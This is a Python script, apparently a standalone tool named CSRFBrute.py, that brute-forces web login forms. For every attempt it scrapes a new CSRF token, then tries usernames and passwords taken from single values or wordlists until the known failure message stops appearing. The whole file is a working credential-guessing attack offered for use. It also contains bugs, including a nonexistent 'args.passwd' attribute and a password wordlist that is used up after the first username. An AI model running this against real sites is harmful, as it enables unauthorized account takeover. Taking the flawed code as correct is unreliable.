import requests
import sys
import warnings
from bs4 import BeautifulSoup
import argparse

def getToken(url, csrfname, request):
	page = request.get(url)
	html_content = page.text
	soup = BeautifulSoup(html_content, features="lxml")
	
	try:
		token = soup.find('input', {"name":csrfname}).get("value")
	except AttributeError:
		print("[-] Wrong csrf token name")
		sys.exit(1)

	return token

def connect(username, password, url, csrfname, token, message, request):
	login_info = {
		"useralias": username,
		"password": password,
		"submitLogin": "Connect",
		csrfname: token
	}
	
	login_request = request.post(url, login_info)

	if message not in login_request.text:
		return True

	else:
		return False

def tryLogin(username, password, url, csrfname, message, request):
	print("[+] Trying "+username+":"+password+" combination")
	print("[+] Retrieving CSRF token to submit the login form")
	token = getToken(url, csrfname, request)

	print("[+] Login token is : {0}".format(token))

	found = connect(username, password, url, csrfname, token, message, request)
	
	if (not found):
		print("[-] Wrong credentials")
		return False
	else:
		print("[+] Logged in sucessfully")
		return True

def printSuccess(username, password):
	print("-------------------------------------------------------------")
	print()
	print("[*] Credentials:\t"+username+":"+password)
	print()

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	
	# usernames can be one or more in a wordlist, but this two ptions are mutual exclusive	
	user_group = parser.add_mutually_exclusive_group(required=True)
	user_group.add_argument('-l', '--username', help='username for bruteforce login')
	user_group.add_argument('-L', '--usernames', help='usernames worldlist for bruteforce login')
	
	# passwords can be one or more in a wordlist, but this two ptions are mutual exclusive
	pass_group = parser.add_mutually_exclusive_group(required=True)
	pass_group.add_argument('-p', '--password', help='password for bruteforce login')
	pass_group.add_argument('-P', '--passwords', help='passwords wordlist for bruteforce login')

	# url
	parser.add_argument('-u', '--url', help='Url with login form', required=True)

	# csrf
	parser.add_argument('-c', '--csrfname', help='The csrf token input name on the login', required=True)

	# error message
	parser.add_argument('-m', '--message', help="The message of invalid cretials in the page after submit", required=True)

	# verbosity
	parser.add_argument('-v', '--verbosity', action='count', help='verbosity level')

	args = parser.parse_args()

	print(
	'''
	##########################################
	|	* CSRFBrute.py                   	 |
	|	* By Edoardo Ermini                  |
	|	* https://github.com/edoermini     	 |
	##########################################
	'''
	)

	# one username and one password
	if (args.usernames == None and args.passwords == None):
		reqSess = requests.session()
		
		if (args.verbosity != None):
			found = tryLogin(args.username, args.password, args.url, args.csrfname, args.message, reqSess)
			print()
		else:
			token = getToken(args.url, args.csrfname, reqSess)
			found = connect(args.username, args.password, args.url, args.csrfname, token, args.message, reqSess)

		if (found):
			printSuccess(args.username, args.passwd)
			sys.exit(1)
		

	# one username and more passwords
	if (args.usernames == None and args.password == None):
		with open(args.passwords, 'rb') as passfile:
			for passwd in passfile.readlines():
				reqSess = requests.session()
				
				if (args.verbosity != None):
					found = tryLogin(args.username, passwd.decode().strip(), args.url, args.csrfname, args.message, reqSess)
					print()
				else:
					token = getToken(args.url, args.csrfname, reqSess)
					found = connect(args.username, passwd.decode().strip(), args.url, args.csrfname, token, args.message, reqSess)

				if (found):
					printSuccess(args.username, passwd.decode().strip())
					sys.exit(1)
	
	# more usernames and one password
	if (args.username == None and args.passwords == None):
		with open(args.usernames, 'rb') as userfile:
			for user in userfile.readlines():
				reqSess = requests.session()
				
				if (args.verbosity != None):
					found = tryLogin(user.decode().strip(), args.password, args.url, args.csrfname, args.message, reqSess)
					print()
				else:
					token = getToken(args.url, args.csrfname, reqSess)
					found = connect(user.decode().strip(), args.password, args.url, args.csrfname, token, args.message, reqSess)

				if (found):
					printSuccess(user.decode().strip(), args.passwd)
					sys.exit(1)

	
	# more usernames and more passwords
	if (args.username == None and args.password == None):	
		with open(args.usernames, 'rb') as userfile:
			with open(args.passwords, 'rb') as passfile:
				for user in userfile.readlines():
					for passwd in passfile.readlines():
						reqSess = requests.session()
						
						if (args.verbosity != None):
							found = tryLogin(user.decode().strip(), passwd.decode().strip(), args.url, args.csrfname, args.message, reqSess)
							print()
						else:
							token = getToken(args.url, args.csrfname, reqSess)
							found = connect(user.decode().strip(), passwd.decode().strip(), args.url, args.csrfname, token, args.message, reqSess)

						if (found):
							printSuccess(user.decode().strip(), passwd.decode().strip())
							sys.exit(1)